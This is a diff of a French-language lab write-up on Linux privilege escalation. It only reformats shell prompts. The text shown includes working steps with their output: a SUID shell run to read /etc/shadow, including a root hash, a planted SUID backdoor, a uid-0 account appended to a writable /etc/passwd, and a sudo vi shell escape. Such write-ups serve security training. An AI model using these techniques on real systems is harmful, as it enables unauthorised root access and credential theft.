@@ -292,7 +292,7 @@ bash -i
 Dès lors il nous suffit de lancer le binaire :  
 
 ```plain
- user3  ~  ./shell
+user3$ ./shell
 You Can't Find Me
 Welcome to Linux Lite 4.4 user3
 
@@ -301,9 +301,9 @@ Memory Usage: 287/985MB (29.14%)
 Disk Usage: 5/217GB (3%)
 Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
- root  ~  id
+root# id
 uid=0(root) gid=0(root) groups=0(root),1002(user3)
- root  ~  head /etc/shadow
+root$ head /etc/shadow
 root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::
 daemon:x:17995:0:99999:7:::
 bin:x:17995:0:99999:7:::
@@ -349,7 +349,7 @@ Saturday 06 July 2019, 20:50:18
 Memory Usage: 308/985MB (31.27%)
 Disk Usage: 6/217GB (3%)
 
- root  ~  id
+root# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
@@ -418,7 +418,7 @@ root@kwak:/tmp/yolo# chmod 4755 backdoor
 Et depuis la cible :  
 
 ```plain
- user5  ~  ls -l
+user5$ ls -l
 total 200
 -rwsr-xr-x 1 root  root  154072 Jul  6 21:12 backdoor
 drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Desktop
@@ -431,7 +431,7 @@ drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Public
 -rwsr-xr-x 1 root  root    8392 Jun  4 15:57 script
 drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Templates
 drwxr-xr-x 2 user5 user5   4096 Jun  4 15:01 Videos
- user5  ~  ./backdoor -p
+user5$ ./backdoor -p
 # id
 uid=1004(user5) gid=1004(user5) euid=0(root) groups=1004(user5)
 ```
@@ -462,15 +462,15 @@ $ find /etc/ -writable -type f  2> /dev/null
 /etc/fstab
 /etc/passwd-
 /etc/hosts
-$ openssl passwd -1 -salt user9 s3cr3t
+$ openssl passwd -1 -salt user9 s3cr3t
 $1$user9$JUQJ5MIu8N.kJJmfhHrfc0
-$ echo 'user9:$1$user9$JUQJ5MIu8N.kJJmfhHrfc0:0:0:/root:/bin/bash' >> /etc/passwd
+$ echo 'user9:$1$user9$JUQJ5MIu8N.kJJmfhHrfc0:0:0:/root:/bin/bash' >> /etc/passwd
 ```
 
 Plus qu'à se connecter avec nos nouveaux identifiants (*user9 / s3cr3t*) :
 
 ```plain
-$ su user9
+$ su user9
 Password:
 # id
 uid=0(root) gid=0(root) groups=0(root)
@@ -480,15 +480,15 @@ User8 vers root
 ---------------
 
 ```plain
- user8  ~  id
+user8$ id
 uid=1007(user8) gid=1007(user8) groups=1007(user8)
- user8  ~  sudo -l
+user8$ sudo -l
 Matching Defaults entries for user8 on osboxes:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User user8 may run the following commands on osboxes:
     (root) NOPASSWD: /usr/bin/vi
- user8  ~  sudo /usr/bin/vi
+user8$ sudo /usr/bin/vi
 
 --- une fois dans Vi on tape :!sh<entrée>
 
